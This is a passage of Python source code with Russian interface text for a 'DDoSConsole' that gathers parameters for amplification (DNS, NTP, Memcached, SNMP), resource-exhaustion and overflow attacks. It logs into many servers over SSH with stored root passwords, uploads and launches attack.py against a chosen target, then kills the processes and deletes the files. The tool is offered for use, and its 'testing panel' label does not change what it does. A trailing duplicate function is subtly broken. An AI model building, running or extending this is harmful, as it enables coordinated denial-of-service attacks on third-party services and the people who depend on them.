                        params["range_end"] = str(end)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Keep-Alive" in attack_name:
                while True:
                    try:
                        timeout = input("Таймаут Keep-Alive в секундах [60]: ").strip() or "60"
                        timeout = int(timeout)
                        if timeout <= 0:
                            print("[ERROR] Таймаут должен быть положительным числом!")
                            continue
                        params["keep_alive_timeout"] = str(timeout)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
        
        elif "Amplification" in attack_name:
            while True:
                try:
                    factor = input("Коэффициент усиления [1]: ").strip() or "1"
                    factor = float(factor)
                    if factor <= 0:
                        print("[ERROR] Коэффициент усиления должен быть положительным числом!")
                        continue
                    params["amplification_factor"] = str(factor)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            if "DNS" in attack_name:
                params["query_type"] = input("Тип запроса [ANY]: ").strip().upper() or "ANY"
                if params["query_type"] not in ["A", "AAAA", "MX", "NS", "SOA", "TXT", "ANY"]:
                    print("[WARNING] Нестандартный тип DNS запроса!")
                    confirm = input("Вы уверены? (y/n): ").strip().lower()
                    if confirm != 'y':
                        params["query_type"] = "ANY"
            
            if "NTP" in attack_name:
                while True:
                    try:
                        version = input("Версия NTP (1-4) [4]: ").strip() or "4"
                        version = int(version)
                        if version < 1 or version > 4:
                            print("[ERROR] Версия NTP должна быть в диапазоне 1-4!")
                            continue
                        params["ntp_version"] = str(version)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Memcached" in attack_name:
                while True:
                    try:
                        size = input("Размер ключа [250]: ").strip() or "250"
                        size = int(size)
                        if size <= 0:
                            print("[ERROR] Размер ключа должен быть положительным числом!")
                            continue
                        params["key_size"] = str(size)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "SNMP" in attack_name:
                params["community"] = input("Community string [public]: ").strip() or "public"
        
        elif "DoS" in attack_name:
            if "Resource" in attack_name or "CPU" in attack_name or "Memory" in attack_name:
                resource_type = input("Тип ресурса (cpu/memory/disk/network): ").strip().lower()
                if resource_type not in ["cpu", "memory", "disk", "network"]:
                    print("[ERROR] Неверный тип ресурса!")
                    resource_type = "cpu"
                params["resource_type"] = resource_type
                
                while True:
                    try:
                        level = input("Уровень истощения (1-100) [100]: ").strip() or "100"
                        level = int(level)
                        if level < 1 or level > 100:
                            print("[ERROR] Уровень истощения должен быть в диапазоне 1-100!")
                            continue
                        params["exhaustion_level"] = str(level)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
            
            if "Buffer" in attack_name or "Stack" in attack_name or "Heap" in attack_name:
                while True:
                    try:
                        size = input("Размер буфера [1024]: ").strip() or "1024"
                        size = int(size)
                        if size <= 0:
                            print("[ERROR] Размер буфера должен быть положительным числом!")
                            continue
                        params["buffer_size"] = str(size)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
                
                while True:
                    try:
                        overflow = input("Размер переполнения [2048]: ").strip() or "2048"
                        overflow = int(overflow)
                        if overflow <= size:
                            print("[ERROR] Размер переполнения должен быть больше размера буфера!")
                            continue
                        params["overflow_size"] = str(overflow)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
        
        elif "Test" in attack_name:
            test_type = input("Тип теста (connect/response/timeout) [connect]: ").strip().lower() or "connect"
            if test_type not in ["connect", "response", "timeout"]:
                print("[ERROR] Неверный тип теста!")
                test_type = "connect"
            params["test_type"] = test_type
            
            while True:
                try:
                    duration = input("Длительность теста в секундах [10]: ").strip() or "10"
                    duration = int(duration)
                    if duration <= 0:
                        print("[ERROR] Длительность должна быть положительным числом!")
                        continue
                    params["test_duration"] = str(duration)
                    break
                except ValueError:
                    print("[ERROR] Введите корректное число!")
            
            if "Ping" in attack_name:
                while True:
                    try:
                        count = input("Количество пингов [4]: ").strip() or "4"
                        count = int(count)
                        if count <= 0:
                            print("[ERROR] Количество пингов должно быть положительным числом!")
                            continue
                        params["ping_count"] = str(count)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")
                
                while True:
                    try:
                        size = input("Размер пинга в байтах [56]: ").strip() or "56"
                        size = int(size)
                        if size <= 0:
                            print("[ERROR] Размер пинга должен быть положительным числом!")
                            continue
                        params["ping_size"] = str(size)
                        break
                    except ValueError:
                        print("[ERROR] Введите корректное число!")

        print("\n[INFO] Параметры атаки успешно настроены!")
        return params

    def execute_attack(self, servers: List[Dict], attack_params: dict, attack_type: str, duration: int):
        """Выполнение атаки на выбранных серверах"""
        try:
            if not servers:
                print("\n[ERROR] Нет доступных серверов для выполнения атаки!")
                return

            # Проверяем наличие файла attack.py
            if not os.path.exists("attack.py"):
                print("\n[ERROR] Файл attack.py не найден в текущей директории!")
                return
                
            # Проверяем содержимое файла attack.py
            try:
                with open("attack.py", "r", encoding="utf-8") as f:
                    content = f.read()
                    if not content.strip():
                        print("\n[ERROR] Файл attack.py пуст!")
                        return
                    if "def main()" not in content:
                        print("\n[ERROR] Файл attack.py не содержит функцию main()!")
                        return
            except Exception as e:
                print(f"\n[ERROR] Ошибка при чтении файла attack.py: {str(e)}")
                return

            # Проверяем, что все серверы онлайн
            online_servers = [s for s in servers if s.get("status") == "online"]
            if not online_servers:
                print("\n[ERROR] Нет доступных онлайн серверов!")
                return

            # Создаем директорию для логов, если её нет
            if not os.path.exists(self.logs_dir):
                os.makedirs(self.logs_dir)

            # Генерируем уникальное имя для лог-файла
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            category, attack_id = attack_type.split('_')
            attack_name = self.attack_types[category][attack_id].replace(" ", "_")
            log_file = os.path.join(self.logs_dir, f"{attack_name}_{timestamp}.log")

            # Создаем заголовок лог-файла
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(f"=== Атака начата {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"Цель: {attack_params['target']}\n")
                f.write(f"Тип атаки: {self.attack_types[category][attack_id]}\n")
                f.write(f"Длительность: {duration} секунд\n")
                f.write(f"Количество серверов: {len(online_servers)}\n")
                f.write("\nПараметры атаки:\n")
                for key, value in attack_params.items():
                    if key != "target":  # Цель уже выведена выше
                        f.write(f"{key}: {value}\n")
                f.write("\nСписок серверов:\n")
                for server in online_servers:
                    f.write(f"- {server['name']} ({server['host']})\n")
                f.write("\n")

            print(f"\n[INFO] Начало атаки на {len(online_servers)} серверов")
            print(f"[INFO] Цель: {attack_params['target']}")
            print(f"[INFO] Тип атаки: {self.attack_types[category][attack_id]}")
            print(f"[INFO] Длительность: {duration} секунд")
            print(f"[INFO] Логи будут сохранены в: {log_file}")

            # Запускаем атаки на всех серверах
            attack_threads = []
            for server in online_servers:
                try:
                    thread = threading.Thread(
                        target=self._execute_attack_on_server,
                        args=(server, attack_params, attack_type, duration, log_file)
                    )
                    thread.start()
                    attack_threads.append(thread)
                    print(f"[INFO] Запущена атака на сервере {server['name']}")
                except Exception as e:
                    print(f"[ERROR] Ошибка при запуске атаки на сервере {server['name']}: {str(e)}")
                    continue

            # Ждем завершения всех атак
            for thread in attack_threads:
                try:
                    thread.join()
                except Exception as e:
                    print(f"[ERROR] Ошибка при ожидании завершения потока: {str(e)}")

            # Добавляем итоговую информацию в лог
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\n=== Атака завершена {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"Общая длительность: {duration} секунд\n")
                f.write(f"Количество задействованных серверов: {len(online_servers)}\n")

            print(f"\n[INFO] Атака успешно завершена!")
            print(f"[INFO] Подробные логи сохранены в файл: {log_file}")
            
        except Exception as e:
            print(f"\n[ERROR] Критическая ошибка при выполнении атаки: {str(e)}")
            if 'log_file' in locals():
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write(f"\nКРИТИЧЕСКАЯ ОШИБКА: {str(e)}\n")

    def _execute_attack_on_server(self, server: Dict, attack_params: dict, attack_type: str, duration: int, log_file: str):
        try:
            print(f"\n[INFO] Подключение к серверу {server['name']} ({server['host']})...")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Расшифровываем пароль перед использованием
            decrypted_password = self.decrypt_password(server['password'])
            
            # Устанавливаем таймауты для SSH
            try:
                ssh.connect(
                    server['host'],
                    port=server['port'],
                    username=server['username'],
                    password=decrypted_password,
                    timeout=30,
                    banner_timeout=30,
                    auth_timeout=30
                )
                print(f"[INFO] Подключение успешно установлено")
            except paramiko.AuthenticationException:
                print(f"[ERROR] Ошибка аутентификации на сервере {server['name']}")
                return
            except Exception as e:
                print(f"[ERROR] Ошибка подключения к серверу {server['name']}: {str(e)}")
                return

            # Проверяем наличие Python3 и необходимых библиотек
            print(f"[INFO] Проверка окружения на сервере...")
            stdin, stdout, stderr = ssh.exec_command("which python3 && python3 -c 'import socket,threading,time'")
            if stdout.channel.recv_exit_status() != 0:
                print(f"[ERROR] На сервере {server['name']} отсутствуют необходимые компоненты")
                return

            # Создаем директорию для атак, если её нет
            print(f"[INFO] Подготовка рабочей директории...")
            stdin, stdout, stderr = ssh.exec_command("mkdir -p /tmp/attacks")
            if stdout.channel.recv_exit_status() != 0:
                print(f"[ERROR] Не удалось создать рабочую директорию на сервере {server['name']}")
                return

            # Копируем скрипт атаки на сервер
            print(f"[INFO] Копирование attack.py на сервер...")
            try:
                sftp = ssh.open_sftp()
                try:
                    # Проверяем размер файла перед копированием
                    local_size = os.path.getsize("attack.py")
                    if local_size == 0:
                        print(f"[ERROR] Файл attack.py пуст!")
                        return
                        
                    sftp.put("attack.py", "/tmp/attacks/attack.py")
                    
                    # Проверяем, что файл был скопирован
                    stdin, stdout, stderr = ssh.exec_command("ls -l /tmp/attacks/attack.py")
                    if stdout.channel.recv_exit_status() != 0:
                        print(f"[ERROR] Файл не был скопирован на сервер {server['name']}")
                        return
                        
                    print(f"[INFO] Файл успешно скопирован")
                finally:
                    sftp.close()
            except Exception as e:
                print(f"[ERROR] Ошибка при копировании файла: {str(e)}")
                return

            # Очищаем предыдущий лог на сервере
            print(f"[INFO] Подготовка лог-файла...")
            stdin, stdout, stderr = ssh.exec_command("> /tmp/attacks/attack_output.log")
            if stdout.channel.recv_exit_status() != 0:
                print(f"[ERROR] Не удалось очистить лог-файл на сервере {server['name']}")
                return

            # Формируем команду с параметрами
            try:
                params_str = " ".join([f"--{k} {v}" for k, v in attack_params.items()])
                if not params_str:
                    print(f"[ERROR] Не удалось сформировать параметры атаки")
                    return
                    
                command = f"cd /tmp/attacks && nohup python3 -u attack.py {attack_type} {params_str} > attack_output.log 2>&1 & echo $!"
                print(f"[INFO] Запуск атаки...")
                
                stdin, stdout, stderr = ssh.exec_command(command)
                pid = stdout.readline().strip()
                
                if not pid:
                    print(f"[ERROR] Не удалось получить PID процесса на сервере {server['name']}")
                    return
                
                # Проверяем, что процесс действительно запущен
                stdin, stdout, stderr = ssh.exec_command(f"ps -p {pid} > /dev/null 2>&1")
                if stdout.channel.recv_exit_status() != 0:
                    print(f"[ERROR] Процесс не был запущен на сервере {server['name']}")
                    return
                
                # Получаем категорию и тип атаки
                category, attack_id = attack_type.split('_')
                attack_name = self.attack_types[category][attack_id]
                
                print(f"\n[INFO] Атака запущена на сервере {server['name']} (PID: {pid})")
                print(f"[INFO] Цель: {attack_params['target']}")
                print(f"[INFO] Тип атаки: {attack_name}")
                
            except Exception as e:
                print(f"[ERROR] Ошибка при запуске атаки на сервере {server['name']}: {str(e)}")
                return
            
            # Ждем указанное время
            time.sleep(duration)
            
            # Останавливаем процессы
            print(f"[INFO] Остановка атаки...")
            try:
                # Сначала пробуем корректно завершить процесс
                stdin, stdout, stderr = ssh.exec_command(f"kill {pid}")
                time.sleep(2)  # Даем время на корректное завершение
                
                # Проверяем, что процесс действительно остановлен
                stdin, stdout, stderr = ssh.exec_command(f"ps -p {pid} > /dev/null 2>&1")
                if stdout.channel.recv_exit_status() == 0:
                    # Если процесс все еще жив, принудительно завершаем
                    print(f"[INFO] Принудительная остановка процесса...")
                    stdin, stdout, stderr = ssh.exec_command(f"kill -9 {pid}")
                
                # Очищаем все оставшиеся процессы
                stdin, stdout, stderr = ssh.exec_command("pkill -9 -f 'python3 /tmp/attacks/attack.py'")
                
                # Даем время на завершение процессов
                time.sleep(1)
                
                # Проверяем оставшиеся процессы
                stdin, stdout, stderr = ssh.exec_command("ps aux | grep -E 'python3 /tmp/attacks/attack.py'")
                remaining = stdout.read().decode()
                if remaining:
                    print(f"[WARNING] Обнаружены оставшиеся процессы:\n{remaining}")
                    # Последняя попытка остановить процессы
                    stdin, stdout, stderr = ssh.exec_command("killall -9 python3")
                else:
                    print(f"[INFO] Все процессы успешно остановлены")
                
                # Даем время на запись лога
                time.sleep(1)
                
                # Получаем лог атаки
                print(f"[INFO] Получение результатов атаки...")
                stdin, stdout, stderr = ssh.exec_command("cat /tmp/attacks/attack_output.log")
                log_content = stdout.read().decode()
                
                if log_content:
                    print(f"[INFO] Получен лог размером {len(log_content)} байт")
                    # Записываем лог в файл
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(f"\n=== Логи с сервера {server['name']} ({server['host']}) ===\n")
                        f.write(log_content)
                        f.write("\n")
                else:
                    print(f"[WARNING] Лог пустой")
                
                # Очищаем временные файлы
                print(f"[INFO] Очистка временных файлов...")
                stdin, stdout, stderr = ssh.exec_command("rm -f /tmp/attacks/attack.py /tmp/attacks/attack_output.log")
                if stdout.channel.recv_exit_status() != 0:
                    print(f"[WARNING] Не удалось очистить временные файлы")
                    
            except Exception as e:
                print(f"[ERROR] Ошибка при остановке процессов на сервере {server['name']}: {str(e)}")
            
            ssh.close()
            print(f"[INFO] SSH соединение закрыто")
            
        except Exception as e:
            error_msg = f"Ошибка при выполнении атаки на сервере {server['name']}: {str(e)}"
            print(f"[ERROR] {error_msg}")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\nОШИБКА: {error_msg}\n")

    def create_template_file(self):
        """Создание шаблона файла для серверов"""
        # Шифруем пароль для примера
        example_password = self.encrypt_password("your_password")
        
        template = {
            "servers": [
                {
                    "name": "example_server",
                    "host": "1.2.3.4",
                    "port": 22,
                    "username": "root",
                    "password": example_password
                }
            ]
        }
        with open(self.template_file, 'w', encoding='utf-8') as f:
            json.dump(template, f, indent=4, ensure_ascii=False)
        print(f"Создан шаблон файла: {self.template_file}")

    def auto_load_servers_from_template(self):
        """Автоматическая загрузка серверов из шаблонного файла при запуске"""
        try:
            if os.path.exists(self.template_file):
                with open(self.template_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                if isinstance(data, dict) and "servers" in data:
                    loaded_count = 0
                    for server_data in data["servers"]:
                        # Пропускаем example_server
                        if server_data.get("name") == "example_server":
                            continue
                            
                        # Проверяем, не существует ли уже сервер с таким именем
                        if any(s["name"] == server_data.get("name", "") for s in self.servers):
                            continue
                        
                        # Шифруем пароль перед сохранением
                        password = server_data.get("password", "")
                        if password and not password.startswith('gAAAAAB'):  # Проверяем, не зашифрован ли уже пароль
                            password = self.encrypt_password(password)
                        
                        server = {
                            "name": server_data.get("name", ""),
                            "host": server_data.get("host", ""),
                            "port": server_data.get("port", 22),
                            "username": server_data.get("username", ""),
                            "password": password,  # Используем зашифрованный пароль
                            "status": "offline"
                        }
                        
                        if server["host"] and server["username"] and server["password"]:
                            self.servers.append(server)
                            loaded_count += 1
                    
                    if loaded_count > 0:
                        # Сохраняем серверы в конфигурационный файл
                        self.save_servers(silent=True)
                        print(f"Автоматически загружено серверов из шаблона: {loaded_count}")
                    
                    # Очищаем шаблонный файл, оставляя только пример
                    self.create_template_file()
                    
        except Exception as e:
            print(f"Ошибка при автоматической загрузке серверов из шаблона: {str(e)}")

    def main_menu(self):
        try:
            while True:
                print("\n=== Панель тестирования ===")
                print("1. Добавить сервер")
                print("2. Список серверов")
                print("3. Обновить статус серверов")
                print("4. Запустить атаку")
                print("5. Выход")
                
                choice = input("\nВыберите действие: ")
                
                if choice == "1":
                    self.add_server()
                elif choice == "2":
                    self.list_servers()
                elif choice == "3":
                    print("\nОбновление статуса серверов...")
                    self.update_server_status()
                    print("Статус серверов обновлен!")
                elif choice == "4":
                    if not self.servers:
                        print("\nСначала добавьте хотя бы один сервер!")
                        continue
                    
                    while True:
                        # Выбор категории атаки
                        self.list_attack_categories()
                        print("\n0. Назад")
                        category = input("\nВыберите категорию атаки: ").strip()
                        
                        if category == "0":
                            break
                            
                        if category not in self.attack_categories:
                            print("Неверная категория атаки!")
                            continue
                        
                        while True:
                            # Выбор конкретной атаки
                            self.list_attack_types(category)
                            print("\n0. Назад")
                            attack_id = input("\nВыберите тип атаки: ").strip()
                            
                            if attack_id == "0":
                                break
                                
                            if attack_id not in self.attack_types[category]:
                                print("Неверный тип атаки!")
                                continue
                            
                            # Получаем полный идентификатор атаки
                            attack_type = self.get_attack_type(category, attack_id)
                            
                            # Выбор серверов
                            self.list_servers()
                            server_choice = input("\nВыберите номер сервера: ").strip()
                            
                            if server_choice == "0":
                                break
                            
                            # Выбор серверов для атаки
                            try:
                                if not server_choice:  # Если пользователь ничего не ввел
                                    # Используем все онлайн сервера по умолчанию
                                    selected_servers = [s for s in self.servers if s.get("status") == "online"]
                                    print(f"\nВыбраны все онлайн сервера ({len(selected_servers)} серверов)")
                                else:
                                    server_index = int(server_choice) - 1
                                    if 0 <= server_index < len(self.servers):
                                        selected_servers = [self.servers[server_index]]
                                    else:
                                        print("Неверный номер сервера!")
                                        continue
                            except ValueError:
                                print("Неверный номер сервера!")
                                continue
                            
                            # Получаем параметры атаки
                            attack_params = self.get_attack_parameters(category, attack_id)
                            
                            # Ввод длительности атаки
                            duration = input("\nВведите длительность атаки в секундах [60]: ").strip()
                            
                            # По умолчанию 60 секунд
                            if not duration:
                                duration = "60"
                            
                            try:
                                duration = int(duration)
                                if duration <= 0:
                                    print("Длительность должна быть положительным числом!")
                                    continue
                            except ValueError:
                                print("Неверный формат длительности!")
                                continue
                            
                            # Запуск атаки
                            self.execute_attack(selected_servers, attack_params, attack_type, duration)
                            break
                        
                        if attack_id == "0":
                            continue
                        break
                    
                elif choice == "5":
                    print("\nЗавершение работы...")
                    break
                else:
                    print("\nНеверный выбор!")
        finally:
            self.running = False  # Останавливаем фоновую проверку при выходе

    def load_or_create_key(self):
        """Загрузка существующего ключа шифрования или создание нового"""
        try:
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    return f.read()
            else:
                key = Fernet.generate_key()
                with open(self.key_file, 'wb') as f:
                    f.write(key)
                return key
        except Exception as e:
            print(f"Ошибка при работе с ключом шифрования: {str(e)}")
            return Fernet.generate_key()  # Создаем новый ключ в случае ошибки

def load_config():
    """Загрузка конфигурации"""
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"servers": []}

def save_config(config):
    """Сохранение конфигурации"""
    with open('config.json', 'w') as f:
        json.dump(config, f, indent=4)

def add_server(server_data):
    """Добавление нового сервера в конфигурацию"""
    config = load_config()
    
    # Создание записи сервера
    server_entry = {
        "name": server_data['name'],
        "host": server_data['ip'],
        "port": 22,
        "username": server_data['username'],
        "password": server_data['password']  # Сохраняем пароль как есть
    }
    
    config['servers'].append(server_entry)
    save_config(config)
    return server_entry

def get_server_credentials(server_name):
    """Получение учетных данных сервера"""
    config = load_config()
    for server in config['servers']:
        if server['name'] == server_name:
            return {
                "host": server['host'],
                "username": server['username'],
                "password": server['password']  # Возвращаем пароль как есть
            }
    return None

def add_new_server():
    """Добавление нового сервера"""
    print("\nДобавление нового сервера")
    name = input("Введите имя сервера: ")
    ip = input("Введите IP-адрес сервера: ")
    username = input("Введите имя пользователя: ")
    password = input("Введите пароль: ")
    
    server_data = {
        "name": name,
        "ip": ip,
        "username": username,
        "password": password
    }
    
    try:
        server_entry = add_server(server_data)
        print(f"\nСервер {name} успешно добавлен!")
    except Exception as e:
        print(f"\nОшибка при добавлении сервера: {str(e)}")

def execute_attack(server_name, attack_type, target):
    """Выполнение атаки на сервере"""
    credentials = get_server_credentials(server_name)
    if not credentials:
        print(f"\nСервер {server_name} не найден в конфигурации!")
        return
    
    try:
        # Подключение к серверу и выполнение атаки
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            credentials['ip'],
            username=credentials['username'],
            password=credentials['password']
        )
        
        # Передача файла attack.py на сервер
        sftp = ssh.open_sftp()
        sftp.put('attack.py', 'attack.py')
        sftp.close()
        
        # Выполнение атаки
        stdin, stdout, stderr = ssh.exec_command(f'python3 attack.py {attack_type} {target}')
        
        # Вывод результатов
        print(f"\nРезультаты атаки с сервера {server_name}:")
        print(stdout.read().decode())
        
        ssh.close()
    except Exception as e:
        print(f"\nОшибка при выполнении атаки: {str(e)}")

if __name__ == "__main__":
    console = DDoSConsole()
    console.update_server_status(silent=True)  # Тихая проверка при запуске
    console.main_menu() 